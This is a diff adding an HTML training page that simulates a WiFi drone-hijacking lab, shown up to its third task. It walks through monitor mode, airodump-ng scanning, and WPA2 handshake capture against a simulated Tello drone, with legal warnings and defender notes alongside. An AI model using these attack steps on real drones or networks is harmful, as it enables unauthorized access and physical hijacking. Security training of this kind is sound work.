@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drone Hacking Lab - WifiForge | Hexworth Prime</title>
+    <!-- Access control must fire before any content renders -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/LinuxTerminal.js"></script>
+    <style>
+        /* ── Reset & Base ─────────────────────────────────────────── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #0a0508;
+            color: #c4b5d4;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Subtle purple ambient glow with a blue-tinted accent for the drone theme */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 20% 25%, rgba(147, 51, 234, 0.12) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 75%, rgba(59, 130, 246, 0.07) 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 50%, rgba(88, 28, 135, 0.06) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ── Header ───────────────────────────────────────────────── */
+        .header {
+            background: rgba(10, 5, 15, 0.97);
+            border-bottom: 1px solid rgba(147, 51, 234, 0.25);
+            padding: 14px 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            backdrop-filter: blur(12px);
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .back-link {
+            color: #7c3aed;
+            text-decoration: none;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 6px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+        .back-link:hover {
+            background: rgba(147, 51, 234, 0.12);
+            border-color: rgba(147, 51, 234, 0.3);
+            color: #a855f7;
+        }
+
+        .header-badge {
+            background: rgba(147, 51, 234, 0.2);
+            color: #c084fc;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.72rem;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            font-weight: 600;
+            border: 1px solid rgba(147, 51, 234, 0.3);
+        }
+
+        .header h1 {
+            font-size: 1.15rem;
+            color: #a855f7;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+
+        /* Score display in header */
+        .header-score {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: #9ca3af;
+        }
+        .score-value {
+            color: #a855f7;
+            font-weight: 700;
+            font-size: 1.1rem;
+            font-variant-numeric: tabular-nums;
+        }
+
+        /* ── Layout: Terminal + Sidebar ───────────────────────────── */
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 370px;
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ── Left: Terminal Panel ─────────────────────────────────── */
+        .terminal-panel {
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid rgba(147, 51, 234, 0.2);
+            overflow: hidden;
+        }
+
+        /* Ethical warning — always visible above terminal */
+        .ethical-warning-banner {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.18), rgba(153, 27, 27, 0.12));
+            border-bottom: 1px solid rgba(220, 38, 38, 0.4);
+            padding: 10px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+        .warning-icon {
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+        .warning-text {
+            font-size: 0.78rem;
+            color: #fca5a5;
+            line-height: 1.4;
+        }
+        .warning-text strong {
+            color: #ef4444;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Current objective prompt strip above terminal */
+        .task-prompt {
+            background: rgba(0, 0, 0, 0.35);
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.15);
+            flex-shrink: 0;
+        }
+        .task-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .task-number {
+            background: #9333ea;
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.82rem;
+            flex-shrink: 0;
+        }
+        .task-number.completed { background: #22c55e; }
+        .task-number.skipped   { background: #f59e0b; }
+
+        .task-meta {
+            font-size: 0.8rem;
+            color: #6b7280;
+        }
+        .task-meta span {
+            color: #9ca3af;
+        }
+
+        .task-question {
+            font-size: 0.97rem;
+            color: #e5e7eb;
+            line-height: 1.55;
+        }
+        .task-question code {
+            background: rgba(147, 51, 234, 0.2);
+            padding: 1px 7px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #c084fc;
+            font-size: 0.9em;
+        }
+
+        .task-hint {
+            font-size: 0.82rem;
+            color: #6b7280;
+            margin-top: 6px;
+            font-style: italic;
+            display: none;
+        }
+        .task-hint.show {
+            display: block;
+            color: #f59e0b;
+        }
+        .task-hint::before {
+            content: 'Hint: ';
+            font-weight: 600;
+        }
+
+        /* Terminal fills remaining space */
+        .terminal-container {
+            flex: 1;
+            min-height: 0;
+        }
+
+        /* Feedback bar below terminal */
+        .feedback-bar {
+            background: rgba(0, 0, 0, 0.45);
+            padding: 11px 24px;
+            border-top: 1px solid rgba(147, 51, 234, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            flex-shrink: 0;
+        }
+        .feedback-message {
+            font-size: 0.85rem;
+            color: #6b7280;
+            flex: 1;
+            min-width: 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .feedback-message.success { color: #22c55e; }
+        .feedback-message.error   { color: #ef4444; }
+
+        .bar-actions {
+            display: flex;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+        .hint-btn, .skip-btn {
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .hint-btn {
+            color: #6b7280;
+        }
+        .hint-btn:hover {
+            background: rgba(147, 51, 234, 0.1);
+            border-color: rgba(147, 51, 234, 0.3);
+            color: #a855f7;
+        }
+        .skip-btn {
+            color: #6b7280;
+        }
+        .skip-btn:hover {
+            background: rgba(245, 158, 11, 0.1);
+            border-color: rgba(245, 158, 11, 0.3);
+            color: #f59e0b;
+        }
+        .hint-btn:disabled, .skip-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        /* ── Right: Sidebar ───────────────────────────────────────── */
+        .sidebar {
+            background: rgba(8, 4, 14, 0.97);
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .sidebar-section-title {
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: #7c3aed;
+            margin-bottom: 10px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(147, 51, 234, 0.2);
+        }
+
+        /* Mission brief callout */
+        .mission-brief {
+            background: rgba(147, 51, 234, 0.07);
+            border-left: 3px solid #9333ea;
+            padding: 10px 14px;
+            border-radius: 0 8px 8px 0;
+        }
+        .mission-brief p {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            line-height: 1.55;
+        }
+        .mission-brief strong {
+            color: #c084fc;
+        }
+
+        /* Legal warning in sidebar */
+        .sidebar-warning {
+            background: linear-gradient(135deg, rgba(220, 38, 38, 0.12), rgba(153, 27, 27, 0.08));
+            border: 1px solid rgba(220, 38, 38, 0.35);
+            border-radius: 8px;
+            padding: 11px 14px;
+        }
+        .sidebar-warning-label {
+            font-size: 0.68rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #ef4444;
+            margin-bottom: 5px;
+        }
+        .sidebar-warning-text {
+            font-size: 0.77rem;
+            color: #fca5a5;
+            line-height: 1.45;
+        }
+
+        /* Progress bar */
+        .progress-section {}
+        .progress-bar-track {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 6px;
+            height: 7px;
+            overflow: hidden;
+            margin: 10px 0 7px;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            border-radius: 6px;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #6b7280;
+            margin-bottom: 14px;
+        }
+        .progress-stats .pct { color: #a855f7; font-weight: 600; }
+
+        /* Objectives list */
+        .objectives-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .obj-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            padding: 8px 10px;
+            border-radius: 7px;
+            background: rgba(255, 255, 255, 0.02);
+            border-left: 3px solid #1f2937;
+            font-size: 0.77rem;
+            color: #6b7280;
+            transition: all 0.25s ease;
+            line-height: 1.4;
+        }
+        .obj-item.active {
+            border-left-color: #9333ea;
+            background: rgba(147, 51, 234, 0.1);
+            color: #e5e7eb;
+        }
+        .obj-item.completed {
+            border-left-color: #22c55e;
+            color: #4ade80;
+        }
+        .obj-item.skipped {
+            border-left-color: #f59e0b;
+            color: #f59e0b;
+            opacity: 0.65;
+        }
+
+        .obj-check {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #1f2937;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.58rem;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        .obj-item.active    .obj-check { border-color: #9333ea; }
+        .obj-item.completed .obj-check { border-color: #22c55e; background: #22c55e; color: #000; }
+        .obj-item.skipped   .obj-check { border-color: #f59e0b; background: #f59e0b; color: #000; }
+
+        /* Defender insight box — reveals after each completion */
+        .defender-box {
+            background: rgba(59, 130, 246, 0.07);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            border-radius: 8px;
+            padding: 10px 13px;
+            display: none;
+        }
+        .defender-box.show { display: block; }
+        .defender-box-title {
+            font-size: 0.67rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            color: #3b82f6;
+            margin-bottom: 4px;
+        }
+        .defender-box-text {
+            font-size: 0.77rem;
+            color: #93c5fd;
+            line-height: 1.45;
+        }
+
+        /* Score breakdown widget */
+        .score-widget {
+            background: rgba(147, 51, 234, 0.06);
+            border: 1px solid rgba(147, 51, 234, 0.2);
+            border-radius: 8px;
+            padding: 12px 14px;
+        }
+        .score-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.8rem;
+            color: #6b7280;
+            padding: 3px 0;
+        }
+        .score-row .val { color: #c4b5d4; font-weight: 600; font-variant-numeric: tabular-nums; }
+        .score-row.total {
+            border-top: 1px solid rgba(147, 51, 234, 0.2);
+            margin-top: 6px;
+            padding-top: 8px;
+            color: #a855f7;
+            font-weight: 700;
+        }
+        .score-row.total .val { color: #a855f7; font-size: 1.05rem; }
+
+        /* ── Completion Modal ──────────────────────────────────────── */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.92);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-overlay.show { display: flex; }
+
+        .modal {
+            background: linear-gradient(145deg, #0d0814, #150b20);
+            border: 2px solid #9333ea;
+            border-radius: 18px;
+            padding: 44px 48px;
+            text-align: center;
+            max-width: 520px;
+            width: 90%;
+            box-shadow: 0 0 60px rgba(147, 51, 234, 0.3);
+            animation: modalIn 0.35s ease;
+        }
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.92) translateY(16px); }
+            to   { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .modal.perfect { border-color: #22c55e; box-shadow: 0 0 60px rgba(34, 197, 94, 0.25); }
+
+        .modal-icon { font-size: 3.6rem; margin-bottom: 14px; }
+        .modal h2 { color: #a855f7; font-size: 1.65rem; margin-bottom: 8px; }
+        .modal.perfect h2 { color: #22c55e; }
+        .modal p { color: #6b7280; font-size: 0.9rem; margin-bottom: 22px; line-height: 1.5; }
+
+        .modal-stats {
+            display: flex;
+            justify-content: center;
+            gap: 36px;
+            margin-bottom: 28px;
+        }
+        .modal-stat { text-align: center; }
+        .modal-stat-value {
+            font-size: 2.2rem;
+            font-weight: 700;
+            color: #fff;
+            font-variant-numeric: tabular-nums;
+        }
+        .modal-stat-value.good  { color: #22c55e; }
+        .modal-stat-value.warn  { color: #f59e0b; }
+        .modal-stat-value.pts   { color: #a855f7; }
+        .modal-stat-label { font-size: 0.82rem; color: #6b7280; margin-top: 4px; }
+
+        .modal-btns {
+            display: flex;
+            gap: 14px;
+            justify-content: center;
+        }
+        .modal-btn {
+            padding: 11px 26px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.2s ease;
+        }
+        .modal-btn.primary {
+            background: linear-gradient(135deg, #9333ea, #a855f7);
+            color: #fff;
+        }
+        .modal-btn.primary:hover { opacity: 0.88; }
+        .modal-btn.secondary {
+            background: rgba(255, 255, 255, 0.07);
+            color: #c4b5d4;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .modal-btn.secondary:hover { background: rgba(255, 255, 255, 0.12); }
+
+        /* ── Responsive: hide sidebar on small screens ─────────────── */
+        @media (max-width: 960px) {
+            .main-container { grid-template-columns: 1fr; }
+            .sidebar { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ── Header ──────────────────────────────────────────────────── -->
+    <header class="header">
+        <div class="header-left">
+            <a href="../index.html" class="back-link">&larr; WiFi Arsenal</a>
+            <span class="header-badge">WifiForge Lab</span>
+            <h1>Drone Hacking</h1>
+        </div>
+        <div class="header-score">
+            Score: <span class="score-value" id="headerScore">100</span>
+        </div>
+    </header>
+
+    <!-- ── Main layout ─────────────────────────────────────────────── -->
+    <div class="main-container">
+
+        <!-- ── Left: Terminal Panel ──────────────────────────────── -->
+        <section class="terminal-panel">
+
+            <!-- Ethical warning banner (always visible) -->
+            <div class="ethical-warning-banner">
+                <span class="warning-icon">&#9888;</span>
+                <p class="warning-text">
+                    <strong>Federal Offense Warning.</strong>
+                    Unauthorized access to unmanned aerial vehicles (UAVs) violates 18 U.S.C. 1030 (CFAA), FAA regulations, and the NDAA. Drone hijacking carries federal criminal penalties. This simulation is authorized for SkyWatch Drone Corp's test facility only.
+                </p>
+            </div>
+
+            <!-- Current objective prompt -->
+            <div class="task-prompt">
+                <div class="task-header">
+                    <div style="display:flex;align-items:center;gap:10px;">
+                        <div class="task-number" id="taskNumber">1</div>
+                        <div class="task-question" id="taskQuestion">Loading...</div>
+                    </div>
+                    <span class="task-meta">Objective <span id="currentTaskNum">1</span> of <span id="totalTasks">8</span></span>
+                </div>
+                <div class="task-hint" id="taskHint"></div>
+            </div>
+
+            <!-- LinuxTerminal mounts here -->
+            <div class="terminal-container" id="terminal"></div>
+
+            <!-- Feedback bar -->
+            <div class="feedback-bar">
+                <div class="feedback-message" id="feedbackMessage">Type a command to begin. Try <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">help</code> or <code style="background:rgba(147,51,234,0.2);padding:1px 5px;border-radius:3px;color:#c084fc;">objectives</code></div>
+                <div class="bar-actions">
+                    <button class="hint-btn" id="hintBtn" onclick="showHint()">Hint (-5 pts)</button>
+                    <button class="skip-btn" id="skipBtn" onclick="skipTask()">Skip</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── Right: Sidebar ────────────────────────────────────── -->
+        <aside class="sidebar">
+
+            <!-- Mission Brief -->
+            <div>
+                <div class="sidebar-section-title">Mission Brief</div>
+                <div class="mission-brief">
+                    <p>
+                        You are conducting an authorized wireless security assessment for
+                        <strong>SkyWatch Drone Corp</strong> at their controlled test facility.
+                        Your objective is to identify vulnerabilities in consumer drone WiFi
+                        implementations — capturing the WPA2 handshake from an active drone,
+                        recovering its pre-shared key, and demonstrating post-exploitation
+                        flight control to prove full system compromise.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Legal Warning -->
+            <div class="sidebar-warning">
+                <div class="sidebar-warning-label">Federal Warning</div>
+                <div class="sidebar-warning-text">
+                    Unauthorized drone access violates 18 U.S.C. 1030 (CFAA), FAA 14 CFR Part 107,
+                    and the 2020 NDAA Section 848. Penalties include federal prosecution, aircraft
+                    seizure, and civil liability. Only operate within your written scope of work
+                    at approved test sites.
+                </div>
+            </div>
+
+            <!-- Progress -->
+            <div class="progress-section">
+                <div class="sidebar-section-title">Progress</div>
+                <div class="progress-bar-track">
+                    <div class="progress-bar-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-stats">
+                    <span><span id="completedCount">0</span> / 8 objectives</span>
+                    <span class="pct" id="progressPct">0%</span>
+                </div>
+            </div>
+
+            <!-- Objectives list -->
+            <div>
+                <div class="sidebar-section-title">Objectives</div>
+                <ul class="objectives-list" id="objList"></ul>
+            </div>
+
+            <!-- Score breakdown -->
+            <div class="score-widget">
+                <div class="sidebar-section-title" style="margin-bottom:8px;">Score</div>
+                <div class="score-row"><span>Base</span><span class="val">100 pts</span></div>
+                <div class="score-row"><span>Hints used</span><span class="val" id="scoreHintDeduct">-0 pts</span></div>
+                <div class="score-row total"><span>Total</span><span class="val" id="scoreFinal">100</span></div>
+            </div>
+
+            <!-- Defender insight (populates after each objective) -->
+            <div class="defender-box" id="defenderBox">
+                <div class="defender-box-title">Defender's Perspective</div>
+                <div class="defender-box-text" id="defenderText"></div>
+            </div>
+
+        </aside>
+    </div>
+
+    <!-- ── Completion Modal ──────────────────────────────────────────── -->
+    <div class="modal-overlay" id="resultsModal">
+        <div class="modal" id="modalContent">
+            <div class="modal-icon" id="modalIcon">&#127942;</div>
+            <h2 id="modalTitle">Lab Complete!</h2>
+            <p id="modalMessage">Full drone compromise workflow demonstrated.</p>
+            <div class="modal-stats">
+                <div class="modal-stat">
+                    <div class="modal-stat-value good" id="modalCompleted">0</div>
+                    <div class="modal-stat-label">Completed</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value warn" id="modalSkipped">0</div>
+                    <div class="modal-stat-label">Skipped</div>
+                </div>
+                <div class="modal-stat">
+                    <div class="modal-stat-value pts" id="modalScore">100</div>
+                    <div class="modal-stat-label">Points</div>
+                </div>
+            </div>
+            <div class="modal-btns">
+                <button class="modal-btn primary" onclick="restartLab()">Restart Lab</button>
+                <a href="../index.html" class="modal-btn secondary">Back to WiFi Arsenal</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    /* ═══════════════════════════════════════════════════════════════
+       WifiForge Lab 09 — Drone Hacking via WiFi
+       WiFi Arsenal / Dark Arts Vault
+       Simulated environment: SkyWatch Drone Corp test facility
+    ═══════════════════════════════════════════════════════════════ */
+
+    /* ── Simulated wireless environment constants ─────────────────── */
+    const DRONE_BSSID      = '02:00:00:00:04:00';   // TELLO-ED4F82 access point
+    const DRONE_SSID       = 'TELLO-ED4F82';
+    const DRONE_CHANNEL    = 3;
+    const DRONE_PSK        = 'drone12345';
+    const CTRL_MAC         = '00:00:00:00:00:01';    // drone-controller client
+    const CAPTURE_FILE     = 'drone-capture-01.cap';
+
+    /* ── Score state ─────────────────────────────────────────────── */
+    const score = { base: 100, hints: 0 };
+
+    /* ── Full airodump scan output (all channels) ─────────────────
+       Shows the test facility RF environment: drone AP, home routers,
+       guest networks — student must identify the drone SSID pattern.  */
+    const AIRODUMP_FULL = `
+<span style="color:#6b7280;">CH  6 ][ Elapsed: 14 s ][ 2025-09-11 08:17:42</span>
+
+<span style="color:#22c55e;"> BSSID              PWR  Beacons  #Data  CH   MB   ENC    CIPHER AUTH  ESSID</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  -38       87      3   ${DRONE_CHANNEL}   54   WPA2   CCMP   PSK   ${DRONE_SSID}</span>
+<span style="color:#c4b5d4;"> DE:AD:BE:EF:01:AA  -58       64      0   ${DRONE_CHANNEL}   54   WPA2   CCMP   PSK   DJI_TEST_B2</span>
+<span style="color:#c4b5d4;"> 7C:2E:BD:47:AA:01  -61       42     18   6  130   WPA2   CCMP   PSK   SkyWatch-Staff</span>
+<span style="color:#c4b5d4;"> 7C:2E:BD:47:AA:02  -62       41      4   6  130   WPA2   CCMP   PSK   SkyWatch-Guest</span>
+<span style="color:#c4b5d4;"> 00:11:22:33:44:FA  -78       19      0  11   54   WPA2   CCMP   PSK   TP-Link_HomeAP</span>
+<span style="color:#c4b5d4;"> 00:25:9C:55:AB:CD  -84        8      0   1   54   OPN                  xfinitywifi</span>
+
+<span style="color:#22c55e;"> BSSID              STATION            PWR   Rate   Lost   Frames  Probe</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  ${CTRL_MAC}  -41   54e-54     0       22  ${DRONE_SSID}</span>
+<span style="color:#c4b5d4;"> 7C:2E:BD:47:AA:01  38:FC:98:11:22:31  -55   54e-11     0       14  SkyWatch-Staff</span>
+<span style="color:#c4b5d4;"> 7C:2E:BD:47:AA:02  9C:B7:0D:AA:BB:01  -67   11e-11     0        5  SkyWatch-Guest</span>`;
+
+    /* ── Targeted airodump (channel-locked on TELLO-ED4F82 / CH 3) ─ */
+    const AIRODUMP_TARGETED_INITIAL = `
+<span style="color:#6b7280;">CH  ${DRONE_CHANNEL} ][ Elapsed: 0 s ][ 2025-09-11 08:19:05</span>
+
+<span style="color:#22c55e;"> BSSID              PWR  Beacons  #Data  CH   MB   ENC    CIPHER AUTH  ESSID</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  -38        0      0   ${DRONE_CHANNEL}   54   WPA2   CCMP   PSK   ${DRONE_SSID}</span>
+
+<span style="color:#22c55e;"> BSSID              STATION            PWR   Rate   Lost   Frames</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  ${CTRL_MAC}  -41   54e-54     0        0</span>
+
+<span style="color:#a855f7;">Writing to: ${CAPTURE_FILE}
+Waiting for WPA handshake...</span>`;
+
+    const AIRODUMP_RUNNING = `
+<span style="color:#6b7280;">CH  ${DRONE_CHANNEL} ][ Elapsed: 31 s ][ 2025-09-11 08:19:36</span>
+
+<span style="color:#22c55e;"> BSSID              PWR  Beacons  #Data  CH   MB   ENC    CIPHER AUTH  ESSID</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  -38       31    118   ${DRONE_CHANNEL}   54   WPA2   CCMP   PSK   ${DRONE_SSID}</span>
+
+<span style="color:#22c55e;"> BSSID              STATION            PWR   Rate   Lost   Frames</span>
+
+<span style="color:#c4b5d4;"> ${DRONE_BSSID}  ${CTRL_MAC}  -41   54e-54     0       88</span>
+
+<span style="color:#a855f7;">Capturing to: ${CAPTURE_FILE} (118 data frames)
+Waiting for WPA handshake...</span>`;
+
+    /* ── Drone ASCII flight grid (post-exploitation output) ───────
+       Shown after python3 control-drones.py succeeds. Represents a
+       10x6 grid with the drone at position (5, 3), altitude 15m.    */
+    const DRONE_GRID = `
+<span style="color:#a855f7;">[ DroneCtrl v2.1 — Connected to ${DRONE_SSID} ]</span>
+<span style="color:#6b7280;">Drone SDK handshake: OK | Battery: 87% | Signal: -38 dBm</span>
+
+<span style="color:#22c55e;">Flight Grid (10x6) — Altitude: 15m</span>
+<span style="color:#6b7280;">  0   1   2   3   4   5   6   7   8   9</span>
+<span style="color:#6b7280;">+---+---+---+---+---+---+---+---+---+---+</span>
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  0
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  1
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  2
+<span style="color:#c4b5d4;">| . | . | . | . | . |</span><span style="color:#22c55e;">[D]</span><span style="color:#c4b5d4;">| . | . | . | . |</span>  3
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  4
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  5
+<span style="color:#6b7280;">+---+---+---+---+---+---+---+---+---+---+</span>
+
+<span style="color:#22c55e;">[D] = TELLO-ED4F82 drone position: (5, 3)</span>
+
+<span style="color:#c084fc;">Flight Commands Available:</span>
+<span style="color:#6b7280;">  takeoff          — arm rotors and ascend to 1m</span>
+<span style="color:#6b7280;">  land             — initiate controlled descent</span>
+<span style="color:#6b7280;">  forward &lt;cm&gt;    — move forward N centimeters</span>
+<span style="color:#6b7280;">  back &lt;cm&gt;       — move backward N centimeters</span>
+<span style="color:#6b7280;">  left &lt;cm&gt;       — strafe left N centimeters</span>
+<span style="color:#6b7280;">  right &lt;cm&gt;      — strafe right N centimeters</span>
+<span style="color:#6b7280;">  up &lt;cm&gt;         — ascend N centimeters</span>
+<span style="color:#6b7280;">  down &lt;cm&gt;       — descend N centimeters</span>
+<span style="color:#6b7280;">  flip &lt;f|b|l|r&gt; — perform directional flip</span>
+<span style="color:#6b7280;">  emergency        — cut all motors immediately</span>
+<span style="color:#6b7280;">  status           — print telemetry</span>`;
+
+    /* ── Flight demonstration output (step 8 post-exploitation) ─── */
+    const FLIGHT_DEMO = `
+<span style="color:#22c55e;">Executing: takeoff</span>
+<span style="color:#6b7280;">  Arming motors... OK</span>
+<span style="color:#6b7280;">  Ascending... altitude 50cm... 80cm... 100cm</span>
+<span style="color:#22c55e;">  Airborne. Drone is now under attacker control.</span>
+
+<span style="color:#6b7280;">Sending: forward 200</span>
+<span style="color:#c4b5d4;">  Moving forward 200cm... OK</span>
+
+<span style="color:#6b7280;">Sending: right 100</span>
+<span style="color:#c4b5d4;">  Moving right 100cm... OK</span>
+
+<span style="color:#22c55e;">Updated Grid (10x6) — Altitude: 100cm</span>
+<span style="color:#6b7280;">  0   1   2   3   4   5   6   7   8   9</span>
+<span style="color:#6b7280;">+---+---+---+---+---+---+---+---+---+---+</span>
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  0
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  1
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  2
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . |</span><span style="color:#22c55e;">[D]</span><span style="color:#c4b5d4;">| . | . |</span>  3
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  4
+<span style="color:#c4b5d4;">| . | . | . | . | . | . | . | . | . | . |</span>  5
+<span style="color:#6b7280;">+---+---+---+---+---+---+---+---+---+---+</span>
+
+<span style="color:#6b7280;">Sending: land</span>
+<span style="color:#c4b5d4;">  Descending... 80cm... 40cm... 10cm... grounded.</span>
+<span style="color:#22c55e;">  Drone landed at (7, 3). Full flight control demonstrated.</span>
+
+<span style="color:#ef4444;">Post-exploitation complete: attacker has full physical control of airspace asset.</span>`;
+
+    /* ── Task definitions ────────────────────────────────────────── */
+    const TASKS = [
+        {
+            /* Phase 1 — Enable monitor mode on the attacker interface */
+            id: 1,
+            question: 'Enable monitor mode on the attacker wireless adapter with <code>airmon-ng start Attacker-wlan0</code>',
+            hint: 'airmon-ng start Attacker-wlan0',
+            validate: c => c.includes('airmon-ng') && c.includes('start') && c.includes('Attacker-wlan0'),
+            response: `PHY     Interface         Driver          Chipset
+
+phy1    Attacker-wlan0    ath9k_htc       Atheros AR9271
+
+        (mac80211 monitor mode vif enabled for [phy1]Attacker-wlan0 on [phy1]Attacker-wlan0mon)
+        (mac80211 station mode vif disabled for [phy1]Attacker-wlan0)
+
+Monitor interface enabled: Attacker-wlan0mon`,
+            successMessage: 'Attacker-wlan0mon is now in monitor mode. The Atheros AR9271 chipset supports packet injection — essential for the deauthentication attack in step 4. Monitor mode allows passive capture of all 802.11 frames including management frames from drone controllers.',
+            defender: 'Consumer drones like the DJI Tello broadcast as a standard WPA2 access point with no MAC filtering or client allowlisting. Enterprise drone fleets should use WPA3-SAE and certificate-based mutual authentication instead of pre-shared keys.'
+        },
+        {
+            /* Phase 2 — Scan all channels to find drone SSIDs */
+            id: 2,
+            question: 'Scan for drone networks with <code>airodump-ng Attacker-wlan0mon</code> — look for SSIDs like DRONE_xxxx, DJI_xxxx, or TELLO-xxxx',
+            hint: 'airodump-ng Attacker-wlan0mon',
+            validate: c =>
+                c.includes('airodump-ng') &&
+                c.includes('Attacker-wlan0mon') &&
+                !c.includes('-c') &&
+                !c.includes('--bssid'),
+            response: AIRODUMP_FULL,
+            successMessage: 'Six APs discovered. TELLO-ED4F82 (02:00:00:00:04:00) on CH 3 matches the drone SSID naming convention. Signal strength -38 dBm indicates the drone is airborne in close proximity. One client (drone-controller) is actively associated.',
+            defender: 'Drone SSIDs follow predictable manufacturer patterns (TELLO-XXXXXX, DJI_XXXXXX, etc.) that make them trivially identifiable in passive scans. Organizations operating drone fleets in sensitive areas should use custom SSIDs, RF shielding in launch zones, and spectrum monitoring to detect unauthorized scanning.'
+        },
+        {
+            /* Phase 3 — Lock onto drone channel and BSSID for capture */
+            id: 3,
+            question: `Lock onto the drone's channel and BSSID with <code>airodump-ng -c 3 --bssid 02:00:00:00:04:00 -w drone-capture Attacker-wlan0mon</code>`,
